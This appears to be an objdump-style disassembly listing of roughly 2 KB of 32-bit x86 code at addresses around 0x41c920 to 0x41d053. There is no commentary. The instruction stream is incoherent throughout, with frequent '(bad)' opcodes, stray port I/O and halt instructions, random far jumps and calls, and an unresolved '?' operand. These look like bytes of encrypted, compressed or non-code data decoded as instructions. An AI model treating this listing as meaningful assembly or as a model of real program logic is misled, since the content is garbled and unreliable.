  41c920:	and    ebp,esp
  41c922:	add    al,0x9e
  41c924:	xchg   si,ax
  41c926:	jecxz  0x41c8bf
  41c928:	rol    BYTE PTR [esi+0x1b],0x93
  41c92c:	xor    ebp,ebx
  41c92e:	sti    
  41c92f:	cs push ds
  41c931:	adc    cl,bh
  41c933:	push   es
  41c934:	sbb    BYTE PTR [edx+0x25d232d5],cl
  41c93a:	push   ebp
  41c93b:	dec    esi
  41c93c:	mov    al,ds:0x6d8d5998
  41c941:	out    0xb,al
  41c943:	cmp    eax,0x8d780411
  41c948:	ret    0xcf2c
  41c94b:	jp     0x41c8e1
  41c94d:	xchg   ebp,eax
  41c94e:	jb     0x41c930
  41c950:	mov    BYTE PTR [esi+0x5a],bl
  41c953:	jg     0x41c992
  41c955:	out    dx,al
  41c956:	stos   DWORD PTR es:[edi],eax
  41c957:	(bad)  
  41c958:	pop    ecx
  41c959:	stc    
  41c95a:	xchg   ebx,eax
  41c95b:	je     0x41c96f
  41c95d:	int    0x38
  41c95f:	add    bh,BYTE PTR [ecx+0x42]
  41c962:	add    eax,0x6f3c333f
  41c967:	sub    BYTE PTR [esi],dh
  41c969:	pop    eax
  41c96a:	push   esi
  41c96b:	ret    
  41c96c:	adc    ecx,ebx
  41c96e:	call   edx
  41c970:	inc    ebp
  41c971:	sub    al,0x8f
  41c973:	mov    ds:0x5db44bce,eax
  41c978:	arpl   cx,di
  41c97a:	jb     0x41c92b
  41c97c:	push   es
  41c97d:	out    dx,eax
  41c97e:	inc    ebx
  41c97f:	rcr    BYTE PTR [esi+0x752a1309],1
  41c985:	bound  ebp,QWORD PTR [eax]
  41c987:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c988:	test   DWORD PTR [esi+0x6776b942],0x602d0e3d
  41c992:	pop    es
  41c993:	or     BYTE PTR [ebp-0x74f3dc13],cl
  41c999:	adc    eax,0x75dc73af
  41c99e:	icebp  
  41c99f:	adc    al,0x23
  41c9a1:	jmp    FWORD PTR [ecx+eiz*8+0x5e]
  41c9a5:	scas   al,BYTE PTR es:[edi]
  41c9a6:	mov    ecx,0x18b7b1f8
  41c9ab:	push   eax
  41c9ac:	(bad)  
  41c9ad:	in     al,0x5d
  41c9af:	and    al,BYTE PTR [esi+0x5134575c]
  41c9b5:	in     al,dx
  41c9b6:	xchg   ebp,eax
  41c9b7:	test   cl,bh
  41c9b9:	ins    DWORD PTR es:[edi],dx
  41c9ba:	aam    0xba
  41c9bc:	push   esp
  41c9bd:	ftst   
  41c9bf:	ins    BYTE PTR es:[edi],dx
  41c9c0:	xlat   BYTE PTR ds:[ebx]
  41c9c1:	mov    ds:0xedaebe0,al
  41c9c6:	pop    ss
  41c9c7:	inc    edx
  41c9c8:	mov    ds:0xc55b357d,al
  41c9cd:	jne    0x41c9b2
  41c9cf:	inc    esp
  41c9d0:	jo     0x41c9ac
  41c9d2:	shl    BYTE PTR cs:[edi-0x633dec2],1
  41c9d9:	addr16 dec ecx
  41c9db:	daa    
  41c9dc:	xor    edx,ebp
  41c9de:	lds    edx,FWORD PTR [edi-0xe9d8252]
  41c9e4:	das    
  41c9e5:	adc    esi,DWORD PTR [esi]
  41c9e7:	push   ebp
  41c9e8:	aaa    
  41c9e9:	into   
  41c9ea:	out    dx,al
  41c9eb:	xchg   DWORD PTR [ebp+0x27e749e9],ebx
  41c9f1:	dec    edi
  41c9f2:	stos   BYTE PTR es:[edi],al
  41c9f3:	push   esp
  41c9f4:	out    0xd4,al
  41c9f6:	sub    eax,DWORD PTR [edx+ebx*4-0x6d875181]
  41c9fd:	sub    edx,ecx
  41c9ff:	les    ebx,FWORD PTR [edx]
  41ca01:	call   DWORD PTR [ecx-0xe09a13e]
  41ca07:	sbb    al,0xa5
  41ca09:	les    esi,FWORD PTR [esi+0x52]
  41ca0c:	inc    ecx
  41ca0d:	aam    0x6
  41ca0f:	dec    ecx
  41ca10:	outs   dx,BYTE PTR ds:[esi]
  41ca11:	add    al,0xa1
  41ca13:	ins    BYTE PTR es:[edi],dx
  41ca14:	test   edx,0x4a3a02d4
  41ca1a:	jecxz  0x41ca44
  41ca1c:	repnz sbb edx,DWORD PTR [eax+edx*2+0x14]
  41ca21:	add    eax,0x5a15e71c
  41ca26:	xor    al,0xe5
  41ca28:	adc    DWORD PTR [ebp+0x1b],0x33bbd79e
  41ca2f:	sti    
  41ca30:	gs je  0x41c9fe
  41ca33:	mov    ebp,0x3565561b
  41ca38:	pop    ebx
  41ca39:	push   ecx
  41ca3a:	cmp    DWORD PTR [esp+edi*2-0x2b20d684],ebx
  41ca41:	dec    edx
  41ca42:	aad    0x29
  41ca44:	pop    esp
  41ca45:	pop    edx
  41ca46:	jbe    0x41ca93
  41ca48:	sub    DWORD PTR [ebx+0x3d65b293],edx
  41ca4e:	fld    DWORD PTR [ebx+0x756772bd]
  41ca54:	inc    edi
  41ca55:	ja     0x41ca73
  41ca57:	pop    eax
  41ca58:	and    eax,0x6e52e338
  41ca5d:	ds dec ebp
  41ca5f:	push   esi
  41ca60:	lods   al,BYTE PTR ds:[esi]
  41ca61:	(bad)  
  41ca62:	mov    BYTE PTR [ebx],0xe5
  41ca65:	int3   
  41ca66:	fdivr  QWORD PTR ds:0x858d4259
  41ca6c:	cmp    bh,BYTE PTR [ebx]
  41ca6e:	push   es
  41ca6f:	hlt    
  41ca70:	jbe    0x41ca71
  41ca72:	jmp    0xbef080ad
  41ca77:	mov    bl,0x13
  41ca79:	aam    0x39
  41ca7b:	cli    
  41ca7c:	mov    ebp,0x68b61d2a
  41ca81:	in     eax,dx
  41ca82:	jns    0x41ca92
  41ca84:	inc    esp
  41ca85:	xchg   ecx,eax
  41ca86:	lods   al,BYTE PTR ds:[esi]
  41ca87:	push   0x5a
  41ca89:	(bad)  
  41ca8a:	test   DWORD PTR [edi-0x38e419b],esi
  41ca90:	pop    ds
  41ca91:	out    0xdc,eax
  41ca93:	pop    esi
  41ca94:	div    DWORD PTR [esi]
  41ca96:	mov    gs,ebx
  41ca98:	call   FWORD PTR [esi]
  41ca9a:	addr16 jg 0x41ca97
  41ca9d:	mov    edx,0x2c7f0da3
  41caa2:	push   esi
  41caa3:	sub    al,0x64
  41caa5:	pop    edx
  41caa6:	ins    BYTE PTR es:[edi],dx
  41caa7:	pushf  
  41caa8:	test   eax,0xb8bdd0db
  41caad:	xchg   ebx,eax
  41caae:	dec    ebp
  41caaf:	push   edx
  41cab0:	push   ds
  41cab1:	in     eax,dx
  41cab2:	inc    edi
  41cab3:	jg     0x41ca9c
  41cab5:	jno    0x41ca99
  41cab7:	stc    
  41cab8:	(bad)  
  41cab9:	icebp  
  41caba:	mov    cl,0x63
  41cabc:	mov    eax,0xa550986c
  41cac1:	push   cs
  41cac2:	sub    eax,ebx
  41cac4:	or     BYTE PTR [ecx+eax*2+0x25bfbb0c],al
  41cacb:	and    ebp,ebx
  41cacd:	scas   eax,DWORD PTR es:[edi]
  41cace:	xchg   edx,eax
  41cacf:	add    al,0x86
  41cad1:	shl    BYTE PTR [ebx],cl
  41cad3:	mov    bh,0xdd
  41cad5:	sbb    DWORD PTR [edi],esp
  41cad7:	call   0x545e:0x5502ce09
  41cade:	xchg   esi,eax
  41cadf:	dec    ecx
  41cae0:	ret    0x3dc7
  41cae3:	mov    ch,0xb0
  41cae5:	hlt    
  41cae6:	imul   ebx,DWORD PTR ds:0x9268228,0xb8346909
  41caf0:	xlat   BYTE PTR ds:[ebx]
  41caf1:	and    bl,BYTE PTR [ebp+0x1acfb2a7]
  41caf7:	sbb    eax,0x98988e83
  41cafc:	into   
  41cafd:	mov    dl,0xff
  41caff:	sub    BYTE PTR [eax],dl
  41cb01:	push   0xfffffffa
  41cb03:	mov    ds:0xe6c0de1c,eax
  41cb08:	pop    ebp
  41cb09:	leave  
  41cb0a:	test   DWORD PTR ds:0xba8dee29,eax
  41cb10:	icebp  
  41cb11:	shr    esi,1
  41cb13:	mov    edx,0x6fc2d0f2
  41cb18:	dec    esi
  41cb19:	pop    edx
  41cb1a:	ins    BYTE PTR es:[edi],dx
  41cb1b:	add    DWORD PTR [edx+0x63],0xffffffc8
  41cb1f:	xchg   edx,eax
  41cb20:	lahf   
  41cb21:	call   DWORD PTR [ebp+0x13580e83]
  41cb27:	mov    cl,ch
  41cb29:	dec    ebp
  41cb2a:	adc    al,0x2f
  41cb2c:	ins    DWORD PTR es:[edi],dx
  41cb2d:	mov    dh,BYTE PTR [edx]
  41cb2f:	rcl    DWORD PTR [ecx],cl
  41cb31:	jmp    0x4ab3:0x52faaa
  41cb38:	leave  
  41cb39:	div    DWORD PTR [ebx]
  41cb3b:	xchg   BYTE PTR [edx+eiz*1+0x16c9da8c],dh
  41cb42:	jle    0x41cb89
  41cb44:	mov    gs,ecx
  41cb46:	mov    BYTE PTR [ebp-0x4e4bc373],bh
  41cb4c:	dec    eax
  41cb4d:	inc    esi
  41cb4e:	mov    ebp,0x6cdec200
  41cb53:	cmc    
  41cb54:	and    ebx,0xffffff82
  41cb57:	imul   esp,DWORD PTR [ecx],0xecefedaa
  41cb5d:	call   0x5b6cff92
  41cb62:	ficom  WORD PTR [edi+0x1a]
  41cb65:	add    al,BYTE PTR [ebx]
  41cb67:	xlat   BYTE PTR ds:[ebx]
  41cb68:	push   eax
  41cb69:	adc    edx,DWORD PTR [eax-0x53e58b43]
  41cb6f:	sti    
  41cb70:	ins    DWORD PTR es:[edi],dx
  41cb71:	aaa    
  41cb72:	pushf  
  41cb73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cb74:	cmp    al,0xac
  41cb76:	fcomp  st(2)
  41cb78:	cmc    
  41cb79:	in     al,0xa8
  41cb7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cb7c:	xor    ch,BYTE PTR [edx-0x71]
  41cb7f:	test   BYTE PTR [esi+0x48d760a5],dl
  41cb85:	push   ebx
  41cb86:	push   esi
  41cb87:	addr16 mov ds:0xfed4,al
  41cb8b:	leave  
  41cb8c:	int    0x4b
  41cb8e:	popa   
  41cb8f:	sahf   
  41cb90:	sbb    al,0xa4
  41cb92:	mov    DWORD PTR [edi+ebp*4+0x62],0x5856fce5
  41cb9a:	int3   
  41cb9b:	and    esi,edx
  41cb9d:	ins    DWORD PTR es:[edi],dx
  41cb9e:	rol    BYTE PTR [ebx-0x76],0xc4
  41cba2:	imul   ebp,DWORD PTR [edx+edi*2+0x6ca2e092],0x10448d66
  41cbad:	sahf   
  41cbae:	jae    0x41cb7b
  41cbb0:	add    DWORD PTR [ecx+eax*4],edi
  41cbb3:	mov    ss,eax
  41cbb5:	adc    eax,0x360593dc
  41cbba:	test   eax,0xb707855f
  41cbbf:	jo     0x41cb97
  41cbc1:	rol    BYTE PTR [edx+0x32],1
  41cbc4:	push   edx
  41cbc5:	dec    ebx
  41cbc6:	ret    
  41cbc7:	xor    dh,BYTE PTR [edi]
  41cbc9:	stos   DWORD PTR es:[edi],eax
  41cbca:	rcl    dh,0x32
  41cbcd:	(bad)  
  41cbcf:	xor    edi,DWORD PTR [edx]
  41cbd1:	pop    esi
  41cbd2:	clc    
  41cbd3:	xlat   BYTE PTR ds:[ebx]
  41cbd4:	out    dx,eax
  41cbd5:	fldcw  WORD PTR [esp+ecx*8]
  41cbd8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cbd9:	adc    DWORD PTR ds:0x66622ca7,esi
  41cbdf:	lea    edi,[eax-0x35]
  41cbe2:	leave  
  41cbe3:	jge    0x41cbfb
  41cbe5:	aas    
  41cbe6:	in     eax,0x74
  41cbe8:	loopne 0x41cbeb
  41cbea:	test   eax,0xfbc992d
  41cbef:	mov    esi,0x10ae73dd
  41cbf5:	pop    eax
  41cbf6:	pop    ebp
  41cbf7:	cli    
  41cbf8:	sub    ch,BYTE PTR [ecx+0x6c410841]
  41cbfe:	int3   
  41cbff:	push   eax
  41cc00:	cmp    al,0xfc
  41cc02:	int    0x6d
  41cc04:	dec    edi
  41cc05:	cwde   
  41cc06:	outs   dx,BYTE PTR ds:[esi]
  41cc07:	sbb    DWORD PTR [esi-0x31cd7fa4],eax
  41cc0d:	fisttp QWORD PTR [eax+0x51]
  41cc10:	jo     0x41cb9c
  41cc12:	(bad)  
  41cc14:	sar    BYTE PTR [ebp-0x29],0x2d
  41cc18:	sar    DWORD PTR [esi],cl
  41cc1a:	mov    edi,0x9b676e69
  41cc1f:	rol    ecx,0x33
  41cc22:	push   eax
  41cc23:	stc    
  41cc24:	lock add bl,dh
  41cc27:	mov    al,ds:0x9eed952b
  41cc2c:	xor    ch,BYTE PTR [edx+0x3c]
  41cc2f:	adc    DWORD PTR [eax+0x569feb77],0xffffff95
  41cc36:	rcl    DWORD PTR [edx],1
  41cc38:	cmp    eax,0x37754873
  41cc3d:	cmc    
  41cc3e:	mov    ecx,0x8b54ae4
  41cc43:	int    0x5f
  41cc45:	outs   dx,BYTE PTR ds:[esi]
  41cc46:	mov    BYTE PTR [ebx],bh
  41cc48:	test   bh,dl
  41cc4a:	mov    dl,BYTE PTR [edx]
  41cc4c:	daa    
  41cc4d:	xor    edi,ebp
  41cc4f:	cmp    BYTE PTR [edx],bl
  41cc51:	mov    cl,0x3c
  41cc53:	loope  0x41cc5f
  41cc55:	das    
  41cc56:	iret   
  41cc57:	push   ebp
  41cc58:	jmp    0x41cc7b
  41cc5a:	add    dh,BYTE PTR [edx+0xe]
  41cc5d:	or     al,0x57
  41cc5f:	sub    ah,BYTE PTR [eax]
  41cc61:	inc    esp
  41cc62:	sub    eax,0x185373f6
  41cc67:	jmp    0xd499a8aa
  41cc6c:	or     al,0xb8
  41cc6e:	ror    edi,1
  41cc70:	xchg   BYTE PTR [edx-0x74b8d707],ch
  41cc76:	ja     0x41cce3
  41cc78:	pop    ss
  41cc79:	icebp  
  41cc7a:	retf   0x78b7
  41cc7d:	jg     0x41ccef
  41cc7f:	dec    esi
  41cc80:	or     BYTE PTR [ecx-0x19],0xb2
  41cc84:	lea    ebx,[esi+0x6c]
  41cc87:	std    
  41cc88:	ret    0x1454
  41cc8b:	push   ebp
  41cc8c:	cmp    ebx,DWORD PTR [ecx]
  41cc8e:	icebp  
  41cc8f:	add    DWORD PTR [esi+eax*2-0x51473c8a],esi
  41cc96:	imul   al
  41cc98:	mov    ebp,0x27304cf9
  41cc9d:	loop   0x41cd1a
  41cc9f:	mov    ebp,0x614d797
  41cca4:	loope  0x41cc90
  41cca6:	mov    ch,0x1d
  41cca8:	xor    BYTE PTR [ecx-0x7c52d4f7],cl
  41ccae:	xlat   BYTE PTR ds:[ebx]
  41ccaf:	neg    BYTE PTR [edi+0x22dc58a6]
  41ccb5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ccb6:	ins    BYTE PTR es:[edi],dx
  41ccb7:	pop    ss
  41ccb8:	stos   BYTE PTR es:[edi],al
  41ccb9:	test   DWORD PTR gs:[eax*2-0x2f28b9d0],esi
  41ccc1:	lahf   
  41ccc2:	out    0xe6,eax
  41ccc4:	ds (bad) 
  41ccc6:	repnz lods al,BYTE PTR ds:[esi]
  41ccc8:	je     0x41cd05
  41ccca:	js     0x41cc5e
  41cccc:	add    DWORD PTR [edi+0x747e0a7b],eax
  41ccd2:	jns    0x41cc73
  41ccd4:	inc    edx
  41ccd5:	cdq    
  41ccd6:	mov    ecx,0x81f7e3f8
  41ccdb:	inc    ecx
  41ccdc:	add    al,0x91
  41ccde:	add    esi,DWORD PTR [ecx]
  41cce0:	inc    edx
  41cce1:	or     ebx,DWORD PTR gs:[eax-0x2cfce928]
  41cce8:	mov    dh,0x77
  41ccea:	in     eax,0x9b
  41ccec:	scas   eax,DWORD PTR es:[edi]
  41cced:	mov    ebp,0xe748ddd
  41ccf2:	push   edi
  41ccf3:	sbb    BYTE PTR [edx],dl
  41ccf5:	sar    BYTE PTR [ebx],1
  41ccf7:	les    ebp,FWORD PTR [esi-0x5a]
  41ccfa:	jne    0x41cd10
  41ccfc:	dec    eax
  41ccfd:	sub    BYTE PTR [ebp+0x1b],ch
  41cd00:	or     eax,0x8bdd3f31
  41cd05:	mov    cl,0x13
  41cd07:	daa    
  41cd08:	shl    BYTE PTR [edi+ecx*1-0x6dccb4b6],1
  41cd0f:	outs   dx,BYTE PTR ds:[esi]
  41cd10:	xchg   edi,eax
  41cd11:	dec    esp
  41cd12:	std    
  41cd13:	sbb    al,0x43
  41cd15:	lock call DWORD PTR ds:0x968d48fc
  41cd1c:	fld    DWORD PTR [ebx*4+0x5260b6ef]
  41cd23:	leave  
  41cd24:	jno    0x41cd66
  41cd26:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cd27:	add    ecx,DWORD PTR [ecx-0x6bdb5ada]
  41cd2d:	test   dl,dl
  41cd2f:	(bad)  
  41cd30:	and    al,0x43
  41cd32:	sbb    ebx,DWORD PTR [ebx-0x1a579531]
  41cd38:	or     al,0xb4
  41cd3a:	popf   
  41cd3b:	mov    cl,0x40
  41cd3d:	adc    eax,0x5ab8d17d
  41cd42:	push   eax
  41cd43:	xchg   esi,eax
  41cd44:	cmp    al,0x13
  41cd46:	lods   al,BYTE PTR ds:[esi]
  41cd47:	bound  ecx,QWORD PTR [eax-0x29]
  41cd4a:	(bad)
  41cd4d:	push   edi
  41cd4e:	into   
  41cd4f:	jne    0x41cd13
  41cd51:	pop    ebp
  41cd52:	push   cs
  41cd53:	xchg   ebp,eax
  41cd54:	push   ebx
  41cd55:	arpl   WORD PTR [eax-0x31],si
  41cd58:	xor    DWORD PTR [edx],esi
  41cd5a:	push   esi
  41cd5b:	jbe    0x41cd4d
  41cd5d:	sbb    edx,esi
  41cd5f:	les    ebp,FWORD PTR ds:[eax+0x24]
  41cd63:	int    0x43
  41cd65:	stc    
  41cd66:	gs stc 
  41cd68:	pop    ecx
  41cd69:	dec    ebp
  41cd6a:	sub    DWORD PTR [ecx-0xb932138],edi
  41cd70:	pop    ds
  41cd71:	shr    DWORD PTR [esi-0xdaea9d7],0x4b
  41cd78:	call   0x24dece12
  41cd7d:	add    BYTE PTR [eax+edi*2-0x2fc53368],0xb7
  41cd85:	jb     0x41cdb0
  41cd87:	repnz mov ecx,0x3973a4d2
  41cd8d:	cmp    ebp,DWORD PTR [esi+esi*4+0x82358b1]
  41cd94:	adc    al,0xb6
  41cd96:	xchg   ebx,eax
  41cd97:	jb     0x41cdf0
  41cd99:	(bad)  
  41cd9a:	sub    DWORD PTR [edi+ebp*4+0x3a],0x4da4260d
  41cda2:	int3   
  41cda3:	aad    0xa2
  41cda5:	mov    esi,DWORD PTR [ebx-0x2e]
  41cda8:	cli    
  41cda9:	lds    ebx,FWORD PTR [ebp+eax*1+0x2b]
  41cdad:	jmp    0x83af6067
  41cdb2:	jmp    0x41cde3
  41cdb4:	in     eax,dx
  41cdb5:	sbb    edi,DWORD PTR [eax]
  41cdb7:	push   esp
  41cdb8:	lds    edi,FWORD PTR [ebx]
  41cdba:	icebp  
  41cdbb:	inc    ebp
  41cdbc:	imul   esp,DWORD PTR [eax],0x6ec213ad
  41cdc2:	mov    al,ds:0x89102359
  41cdc7:	imul   esi,DWORD PTR [esi-0x5833d8e6],0x33
  41cdce:	pop    edi
  41cdcf:	inc    edx
  41cdd0:	sbb    al,BYTE PTR [ebx]
  41cdd2:	rcr    BYTE PTR [ecx+0x4d],1
  41cdd5:	jo     0x41cd99
  41cdd7:	xchg   esp,eax
  41cdd8:	call   0x584a:0x5ff13175
  41cddf:	xchg   DWORD PTR [eax+eax*1-0x533aea01],ebp
  41cde6:	pop    esp
  41cde7:	leave  
  41cde8:	sub    BYTE PTR [ebp+0x4e5b4586],ch
  41cdee:	int    0x49
  41cdf0:	cwde   
  41cdf1:	jnp    0x41cd7d
  41cdf3:	ret    
  41cdf4:	int    0xfd
  41cdf6:	jno    0x41cd80
  41cdf8:	sti    
  41cdf9:	or     BYTE PTR [esi+esi*8-0x16724089],ch
  41ce00:	mov    edx,0x79fb0c1a
  41ce05:	xor    esp,DWORD PTR [edi]
  41ce07:	xchg   edi,eax
  41ce08:	push   0x5a777384
  41ce0d:	out    dx,al
  41ce0e:	sbb    esp,DWORD PTR [eax-0x5b]
  41ce11:	inc    ebp
  41ce12:	inc    edx
  41ce13:	mov    esi,0xaa887683
  41ce18:	into   
  41ce19:	jmp    0x1664fbd9
  41ce1e:	enter  0xd383,0xe9
  41ce22:	stc    
  41ce23:	mov    DWORD PTR [ebp+edi*1+0x411e5b98],edx
  41ce2a:	adc    eax,0x4c4532ec
  41ce2f:	sub    al,0x6c
  41ce31:	xchg   edi,eax
  41ce32:	ret    0x31dd
  41ce35:	push   es
  41ce36:	mov    ebx,0xb8653095
  41ce3b:	pop    ds
  41ce3c:	inc    ebx
  41ce3d:	rcl    BYTE PTR [eax-0x6c],1
  41ce40:	pop    edx
  41ce41:	xchg   DWORD PTR [eax],edi
  41ce43:	or     BYTE PTR [ebx+0x5d],ch
  41ce46:	push   es
  41ce47:	das    
  41ce48:	adc    eax,0xe2a9ba51
  41ce4d:	mov    dl,0x23
  41ce4f:	scas   eax,DWORD PTR es:[edi]
  41ce50:	mov    DWORD PTR [ebp+0x66],ebp
  41ce53:	mov    bh,0xfa
  41ce55:	mov    al,0x99
  41ce57:	jmp    0x41cdf4
  41ce59:	push   ecx
  41ce5a:	fs (bad) 
  41ce5c:	xor    eax,0x8b7ba788
  41ce61:	push   esi
  41ce62:	into   
  41ce63:	mov    dh,0xae
  41ce65:	mov    gs,WORD PTR [edx-0x20]
  41ce68:	cmp    dh,dh
  41ce6a:	push   cs
  41ce6b:	test   BYTE PTR [ecx-0x15],0xca
  41ce6f:	jb     0x41cee6
  41ce71:	scas   al,BYTE PTR es:[edi]
  41ce72:	add    al,0xd
  41ce74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ce75:	bound  edi,QWORD PTR [esi+0x31d34cd9]
  41ce7b:	or     al,0x5c
  41ce7d:	(bad)  
  41ce7e:	xchg   ecx,eax
  41ce7f:	ins    DWORD PTR es:[edi],dx
  41ce80:	or     al,0xa8
  41ce82:	mov    ebp,0x6f288588
  41ce87:	cmp    DWORD PTR [edx+0x44],esp
  41ce8a:	adc    eax,0xa652256f
  41ce8f:	push   eax
  41ce90:	test   eax,0xe7c7db31
  41ce95:	push   ebp
  41ce96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ce97:	(bad)  
  41ce98:	jb     0x41ce54
  41ce9a:	aam    0x7f
  41ce9c:	ficomp WORD PTR [eax-0x49]
  41ce9f:	lahf   
  41cea0:	ja     0x41ce3a
  41cea2:	nop
  41cea3:	in     eax,0x51
  41cea5:	jbe    0x41cee1
  41cea7:	psubd  mm6,QWORD PTR [esp+ebp*1]
  41ceab:	(bad)  
  41ceac:	adc    BYTE PTR [ebp+0x209c461],bh
  41ceb2:	out    dx,al
  41ceb3:	pop    esp
  41ceb4:	and    eax,esi
  41ceb6:	clc    
  41ceb7:	lock outs dx,BYTE PTR ds:[esi]
  41ceb9:	add    al,0x3d
  41cebb:	jl     0x41ce3e
  41cebd:	pop    eax
  41cebe:	mov    esp,ecx
  41cec0:	mov    ah,0x1
  41cec2:	in     eax,dx
  41cec3:	cdq    
  41cec4:	fdiv   DWORD PTR [edi+edx*8+0x28ccaee9]
  41cecb:	(bad)  
  41cecc:	jmp    0x2f7c:0xe9e03096
  41ced3:	sbb    BYTE PTR [ecx+0x7000310a],ah
  41ced9:	pop    edi
  41ceda:	inc    esp
  41cedb:	test   BYTE PTR cs:[eax-0x57bf3f1b],dl
  41cee2:	arpl   bp,dx
  41cee4:	imul   ebp,DWORD PTR [eax+0x3c425c16],0xffffffde
  41ceeb:	hlt    
  41ceec:	dec    esi
  41ceed:	fnsave ds:0x296a2c81
  41cef3:	cwde   
  41cef4:	into   
  41cef5:	mov    dl,BYTE PTR [eax+0x102afa04]
  41cefb:	xor    eax,0x82679acc
  41cf00:	sub    eax,0xf30cadb6
  41cf05:	scas   eax,DWORD PTR es:[edi]
  41cf06:	xor    ebx,ebp
  41cf08:	loopne 0x41cece
  41cf0a:	jmp    0x3dc00736
  41cf0f:	aaa    
  41cf10:	adc    eax,esi
  41cf12:	test   DWORD PTR [edi+0x5da4a4ab],eax
  41cf18:	rcr    esp,0x3
  41cf1b:	jo     0x41cf6d
  41cf1d:	xchg   ebp,eax
  41cf1e:	pop    esi
  41cf1f:	(bad)  [edi-0x50f87b70]
  41cf25:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cf26:	shl    bh,1
  41cf28:	inc    eax
  41cf29:	adc    al,BYTE PTR [ebp-0x12]
  41cf2c:	stc    
  41cf2d:	add    bh,bh
  41cf2f:	lds    eax,FWORD PTR [edx-0x3aa2bb64]
  41cf35:	mov    eax,ds:0x61f3739
  41cf3a:	inc    edi
  41cf3b:	xchg   ebp,eax
  41cf3c:	dec    edi
  41cf3d:	inc    ebx
  41cf3e:	pop    ebp
  41cf3f:	cmp    BYTE PTR ds:0xfab588f5,cl
  41cf45:	in     al,dx
  41cf46:	lods   al,BYTE PTR ds:[esi]
  41cf47:	fsub   QWORD PTR [edi+ecx*4+0x35]
  41cf4b:	pusha  
  41cf4c:	mov    ebx,0x21feea0
  41cf51:	in     eax,dx
  41cf52:	loope  0x41cf30
  41cf54:	push   eax
  41cf55:	mov    es,WORD PTR [ecx+0xf]
  41cf58:	sbb    al,BYTE PTR [edi]
  41cf5a:	rcr    DWORD PTR [esi],0x67
  41cf5d:	mov    ds:0xb9f8d7bc,eax
  41cf62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cf63:	aaa    
  41cf64:	cmovae ebx,DWORD PTR [edx]
  41cf67:	jp     0x41cf2c
  41cf69:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cf6a:	push   esp
  41cf6b:	inc    edi
  41cf6c:	xor    eax,0xa86eef5c
  41cf71:	pop    ebp
  41cf72:	adc    BYTE PTR [esi-0x32977321],bh
  41cf78:	cwde   
  41cf79:	out    0xcd,eax
  41cf7b:	and    DWORD PTR ss:[ebx+0x55],esi
  41cf7f:	daa    
  41cf80:	(bad)  
  41cf81:	sti    
  41cf82:	inc    esi
  41cf83:	loop   0x41cf52
  41cf85:	and    eax,0xc137fcde
  41cf8a:	or     al,0xd0
  41cf8c:	jbe    0x41cfa5
  41cf8e:	mov    cl,0x53
  41cf90:	cmp    eax,0x33395192
  41cf95:	ja     0x41cfa7
  41cf97:	push   edx
  41cf98:	inc    ebx
  41cf99:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cf9a:	cmovs  edx,edx
  41cf9d:	dec    esp
  41cf9e:	xchg   ebx,eax
  41cf9f:	nop
  41cfa0:	cli    
  41cfa1:	in     eax,dx
  41cfa2:	add    ebx,esp
  41cfa4:	lock es jecxz 0x41cf2e
  41cfa8:	sbb    cl,BYTE PTR [eax-0x16]
  41cfab:	add    DWORD PTR [edx+0x204262b6],esi
  41cfb1:	jge    0x41cfbc
  41cfb3:	clc    
  41cfb4:	and    al,BYTE PTR [eax+0x64]
  41cfb7:	call   0xb720:0x7d1f5a8b
  41cfbe:	adc    ch,al
  41cfc0:	xchg   DWORD PTR [ecx],esi
  41cfc2:	xchg   edx,eax
  41cfc3:	mov    esi,edi
  41cfc5:	mov    eax,ds:0x696c18e8
  41cfca:	pop    ss
  41cfcb:	cld    
  41cfcc:	dec    ebp
  41cfcd:	int3   
  41cfce:	aam    0xa
  41cfd0:	aaa    
  41cfd1:	pop    esp
  41cfd2:	dec    esi
  41cfd3:	loopne 0x41cf63
  41cfd5:	sbb    al,0x1
  41cfd7:	imul   ebx,DWORD PTR [ebx],0xffffff87
  41cfda:	jp     0x41cf91
  41cfdc:	pop    edi
  41cfdd:	int3   
  41cfde:	mov    WORD PTR [esi-0x57248365],?
  41cfe4:	in     al,dx
  41cfe5:	cmp    esi,DWORD PTR [eax+0x2dd6dee2]
  41cfeb:	inc    edi
  41cfec:	ins    BYTE PTR es:[edi],dx
  41cfed:	jb     0x41cfa5
  41cfef:	inc    ecx
  41cff0:	cs push ebx
  41cff2:	push   esi
  41cff3:	dec    edx
  41cff4:	inc    esi
  41cff5:	repz mov dh,0xc6
  41cff8:	jns    0x41d006
  41cffa:	mov    ds:0x10c93119,eax
  41cfff:	pop    eax
  41d000:	xchg   edi,eax
  41d001:	mov    ebx,0xd1eb28e9
  41d006:	jns    0x41cfc5
  41d008:	jns    0x41d022
  41d00a:	data16 mov BYTE PTR [esi+ebx*2],cl
  41d00e:	jns    0x41d02c
  41d010:	outs   dx,DWORD PTR ds:[esi]
  41d011:	xor    al,0xe6
  41d013:	adc    DWORD PTR [edi],edx
  41d015:	mov    WORD PTR [eax],cs
  41d017:	sti    
  41d018:	mov    dl,0x0
  41d01a:	xor    eax,0x120dea65
  41d01f:	xlat   BYTE PTR ds:[ebx]
  41d020:	(bad)  
  41d021:	lods   eax,DWORD PTR ds:[esi]
  41d022:	inc    edx
  41d023:	pop    edi
  41d024:	dec    esi
  41d025:	and    eax,DWORD PTR [esi+edx*2+0x4f]
  41d029:	imul   esp,DWORD PTR [ebp-0x43],0x4d84cdfa
  41d030:	ret    
  41d031:	or     BYTE PTR [edi-0x7a],0xfe
  41d035:	faddp  st(3),st
  41d037:	in     al,0x69
  41d039:	cmp    eax,0xaca14f1e
  41d03e:	and    al,0x83
  41d040:	and    esi,ebx
  41d042:	repnz es push ebx
  41d045:	inc    edx
  41d046:	or     al,0x65
  41d048:	not    DWORD PTR [edx-0x1]
  41d04b:	xor    DWORD PTR [esi+0x5f8a1612],ebp
  41d051:	iret   
  41d052:	aaa    
  41d053:	sbb    BYTE PTR [edx+0x7becaa9],al
